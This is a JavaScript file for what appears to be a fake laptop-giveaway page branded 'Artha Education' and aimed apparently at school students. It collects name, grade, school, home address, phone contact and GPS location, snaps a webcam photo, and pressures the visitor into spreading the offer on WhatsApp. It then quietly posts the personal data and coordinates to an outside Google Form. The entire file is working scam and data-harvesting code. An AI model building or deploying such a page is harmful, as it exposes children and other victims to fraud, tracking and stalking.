let userData = {};
let shared = false;

function proceedCamera() {
  userData = {
    name: document.getElementById("name").value,
    grade: document.getElementById("grade").value,
    school: document.getElementById("school").value,
    address: document.getElementById("address").value,
    contact: document.getElementById("contact").value,
    location: ''
  };

  if (!userData.name || !userData.grade || !userData.school || !userData.address || !userData.contact) {
    alert("Please fill in all fields.");
    return;
  }

  navigator.geolocation.getCurrentPosition(pos => {
    userData.location = `${pos.coords.latitude}, ${pos.coords.longitude}`;
  });

  navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
    const video = document.getElementById('video');
    video.srcObject = stream;
    setTimeout(() => {
      const canvas = document.getElementById('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imageData = canvas.toDataURL('image/png');
      userData.photo = imageData;
      document.getElementById('capturedImage').src = imageData;
      stream.getTracks().forEach(track => track.stop());

      document.getElementById('formStep').style.display = "none";
      document.getElementById('shareStep').style.display = "block";
    }, 3000);
  }).catch(() => alert("Camera permission required!"));
}

function shareWhatsApp() {
  if (shared) return;
  shared = true;
  let count = 0;
  let shareLink = "https://wa.me/?text=🎁 I just claimed a laptop from Artha Education – Try it now!";
  window.open(shareLink, "_blank");

  const interval = setInterval(() => {
    count++;
    if (count === 5) {
      clearInterval(interval);
      submitToGoogleForm();
    }
  }, 1000);
}

function submitToGoogleForm() {
  const url = "https://docs.google.com/forms/d/e/1FAIpQLScPUa7P9wKKkEmwimOmOIhTgIM7u9zhETOYqIURWcerO3s4Dg/formResponse";
  const formData = new FormData();
  formData.append("entry.997021349", userData.name);
  formData.append("entry.180306948", userData.grade);
  formData.append("entry.74488444", userData.school);
  formData.append("entry.377707306", userData.address);
  formData.append("entry.1450609673", userData.contact);
  formData.append("entry.1946665100", userData.location);

  fetch(url, {
    method: "POST",
    mode: "no-cors",
    body: formData
  });

  document.getElementById("r_name").innerText = userData.name;
  document.getElementById("r_grade").innerText = userData.grade;
  document.getElementById("r_school").innerText = userData.school;
  document.getElementById("r_address").innerText = userData.address;
  document.getElementById("r_contact").innerText = userData.contact;
  document.getElementById("r_location").innerText = userData.location;

  document.getElementById("shareStep").style.display = "none";
  document.getElementById("finalStep").style.display = "block";
  showMap(userData.location);
}

function showMap(loc) {
  if (!loc) return;
  const [lat, lng] = loc.split(',');
  const mapFrame = document.createElement("iframe");
  mapFrame.src = `https://maps.google.com/maps?q=${lat},${lng}&z=15&output=embed`;
  mapFrame.style.width = "100%";
  mapFrame.style.height = "100%";
  mapFrame.style.border = "0";
  document.getElementById("map").appendChild(mapFrame);
}
